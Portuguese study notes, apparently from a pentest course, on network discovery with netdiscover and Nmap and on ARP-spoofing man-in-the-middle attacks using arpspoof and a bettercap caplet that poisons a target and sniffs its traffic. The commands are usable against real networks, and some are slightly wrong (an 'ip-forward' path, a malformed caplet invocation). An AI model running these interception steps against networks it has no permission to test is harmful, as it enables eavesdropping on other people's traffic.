# Explorando a rede

## netdiscover

- A máquina precisa estar na rede que irá ser explorada

  `$ netdiscover -r (ip inicial)/(cód. ips explorados)`

*Exemplo:*<br>
*$ sudo netdiscover -r 192.168.1.1/24*

 Currently scanning: Finished!   |   Screen View: Unique Hosts         
                                                                       
  11 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 534             
 |  IP           |   At MAC Address     | Count |    Len | MAC Vendor / Hostname      |
 |---------------|----------------------|-------|--------|-------------------------|
 | 192.168.1.5   |   74:56:3c:97:60:fa  |  1  | 60  | GIGA-BYTE TECHNOLOGY |
 | 192.168.1.3   |   08:6f:48:00:68:36  |  1  | 42  | Shenzhen iComm Semic |
 | 192.168.1.26  |   5c:52:1e:9c:38:0a  |  1  | 42  | Nintendo Co.,Ltd     |
 | 192.168.1.18  |   5e:47:36:78:fd:47  |  1  | 42  | Unknown vendor      | 
 | 192.168.1.6   |   6e:40:4e:cf:c4:51  |  1  | 42  | Unknown vendor       |
 | 192.168.1.2   |   3a:2f:6f:05:cd:c1  |  1  | 42  | Unknown vendor       |
 | 192.168.1.254 |   78:3e:a1:89:7d:10  |  5  | 264 | Nokia Shanghai Bell  |

## NMAP e ZENMAP

- Não precisa estar limitado a mesma rede
- ZENMAP é a versão gráfica do NMAP

1️⃣ **Interface e campos principais**

Target: onde você coloca o alvo (IP, range ou domínio).

- Ex.: 192.168.0.1 ou scanme.nmap.org ou 192.168.0.0/24

Profile: tipo de varredura predefinida:

- Intense scan — varredura detalhada.
- Quick scan — rápida.
- Ping scan — apenas detecta hosts ativos.
- Intense scan plus UDP — inclui portas UDP.

Command: mostra o comando Nmap que será executado (você pode editar).

Scan: botão para iniciar.

2️⃣ Analisando os resultados

O Zenmap tem abas para visualizar resultados:

- Nmap Output → saída textual do Nmap.

- Ports / Hosts → lista de hosts e portas abertas.

- Topology → mapa gráfico da rede.

- Host Details → informações do host.

- Scans → histórico.

# ARP Spoofing

## ARP (Address Resolution Protocol)

`$ arp -a`
- Retorna equipamentos que compõe a rede
```
*Exemplo de resposta*
? (192.168.1.5) em 74:56:3c:97:60:fa [ether] em wlan0<br>
? (192.168.1.4) em be:28:f4:d3:15:7d [ether] em wlan0<br>
www.webgui.Nokiawifi.com (192.168.1.254) em 78:3e:a1:89:7d:10 [ether] em wlan0<br>
? (192.168.1.3) em 08:6f:48:00:68:36 [ether] em wlan0<br>
? (192.168.1.2) em 3a:2f:6f:05:cd:c1 [ether] em wlan0<br>
? (192.168.1.26) em 5c:52:1e:9c:38:0a [ether] em wlan0<br>
? (192.168.1.6) em 6e:40:4e:cf:c4:51 [ether] em wlan0
```
## ARPSpoof
Desvia o fluso de informação para sua máquina (man in the midle)
- Troca o MAC do cache do alvo pelo MAC da máquina de ataque
- Necessita outros aplicativos para exibir as informação (ex.: wireshark)

**Em um terminal:**<br>
Engana a máquina cliente<br>
`$ arpspoof -i (interface) -t (IP cliente) (IP gateway)`

**simulataneamente em outro terminal (2):**<br>
Engana o gateway<br>
`$ arpspoof -i (interface) -t (IP gateway) (IP cliente)`

**simulataneamente em outro terminal (3):**<br>
Repassa o fluxo<br>
`$ echo 1 > /proc/sys/net/ipv4/ip-forward`

## BetterCap
Desvia o fluso de informação para sua máquina (como o ARPSpoof) e mais

`$ bettercap -iface (interface)`

*Exemplo:*
*$ bettercap -iface wlan0*

bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

#### 192.168.1.0/24 > 192.168.1.10  » `help`
```
             help MODULE : List available commands or show module specific help if no module name is provided.<br>
                  active : Show information about active modules.<br>
                    quit : Close the session and exit.<br>
           sleep SECONDS : Sleep for the given amount of seconds.<br>
                get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.<br>
          set NAME VALUE : Set the VALUE of variable NAME.<br>
    read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.<br>
                   clear : Clear the screen.<br>
          include CAPLET : Load and run this caplet in the current session.<br>
               ! COMMAND : Execute a shell command and print its output.<br>
           alias MAC NAME : Assign an alias to a given endpoint given its MAC address.

Modules<br><br>
      any.proxy > not running<br>
       api.rest > not running<br>
      arp.spoof > not running<br>
      ble.recon > not running<br>
             c2 > not running<br>
        caplets > not running<br>
    dhcp6.spoof > not running<br>
      dns.spoof > not running<br>
  events.stream > running<br>
            gps > not running<br>
          graph > not running<br>
            hid > not running<br>
     http.proxy > not running<br>
    http.server > not running<br>
    https.proxy > not running<br>
   https.server > not running<br>
    mac.changer > not running<br>
    mdns.server > not running<br>
   mysql.server > not running<br>
      ndp.spoof > not running<br>
      net.probe > not running<br>
      net.recon > not running<br>
      net.sniff > not running<br>
   packet.proxy > not running<br>
       syn.scan > not running<br>
      tcp.proxy > not running<br>
         ticker > not running<br>
             ui > not running<br>
         update > not running<br>
           wifi > not running<br>
            wol > not running<br>
```

#### 192.168.1.0/24 > 192.168.1.10  » `help net.probe`
```
net.probe (not running): Keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.

  net.probe on : Start network hosts probing in background.<br>
  net.probe off : Stop network hosts probing in background.

  Parameters<br><br>
      net.probe.mdns : Enable mDNS discovery probes. (default=true)<br>
      net.probe.nbns : Enable NetBIOS name service discovery probes. (default=true)<br>
  net.probe.throttle : If greater than 0, probe packets will be throttled by this value in milliseconds. (default=10)<br>
      net.probe.upnp : Enable UPNP discovery probes. (default=true)<br>
       net.probe.wsd : Enable WSD discovery probes. (default=true)<br>
```
#### 192.168.1.0/24 > 192.168.1.10  » `help net.recon`
```
net.recon (not running): Read periodically the ARP cache in order to monitor for new hosts on the network.<br><br>
                      net.recon on : Start network hosts discovery.<br>
                     net.recon off : Stop network hosts discovery.<br>
                         net.clear : Clear all endpoints collected by the hosts discovery module.<br>
                          net.show : Show cache hosts list (default sorting by ip).<br>
       net.show ADDRESS1, ADDRESS2 : Show information about a specific comma separated list of addresses (by IP or MAC).<br>
  net.show.meta ADDRESS1, ADDRESS2 : Show meta information about a specific comma separated list of addresses (by IP or MAC).<br>

  Parameters

  net.show.filter : Defines a regular expression filter for net.show (default=)<br>
   net.show.limit : Defines limit for net.show (default=0)<br>
    net.show.meta : If true, the net.show command will show all metadata collected about each endpoint. (default=false)<br>
    net.show.sort : Defines sorting field (ip, mac, seen, sent, rcvd) and direction (asc or desc) for net.show (default=ip asc)<br>
```
#### 92.168.1.0/24 > 192.168.1.10  » `net.recon on`
```
192.168.1.0/24 > 192.168.1.10  » [23:26:13] [endpoint.new] endpoint 192.168.1.254 detected as 78:3e:a1:89:7d:10 (Nokia Shanghai Bell Co., Ltd.).
```
#### 192.168.1.0/24 > 192.168.1.10  » `net.show`
```
| IP            | MAC                | Name                        | Vendor                                                 | Sent  | Recvd  | Seen     |
|---------------|--------------------|-----------------------------|--------------------------------------------------------|-------|--------|----------|
| 192.168.1.10  | 5c:c9:d3:75:ce:ad  | wlan0                       | PALLADIUM ENERGY ELETRONICA DA AMAZONIA LTDA           | 0 B   | 0 B    | 23:13:01 |
| 192.168.1.254 | 78:3e:a1:89:7d:10  | www.webgui.Nokiawifi.com.   | Nokia Shanghai Bell Co., Ltd.                          | 9.5 kB| 6.5 kB | 23:26:20 |

↑ 0 B / ↓ 1.8 MB / 8613 pkts
```
---
### Ataque em HTTP
---

#### 192.168.1.0/24 > 192.168.1.10  » `set arp.spoof.fullduplex true`

#### 192.168.1.0/24 > 192.168.1.10  » `set arp.spoof.target {lista de endereços}`

#### 192.168.1.0/24 > 192.168.1.10  » `arp.spoof on`

#### 192.168.1.0/24 > 192.168.1.10  » `net.sniff on`

**Exemplo de script de atque:**
```
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.target 192.168.1.5
arp.spoof on
net.sniff on
```
- Salvar o arquivo {nome}.cap
- Rodar o script pelo bettercap

`$ bettercap iface wlan0 - caplet arquivo.cap`

---
### Ataque em HTTP
---
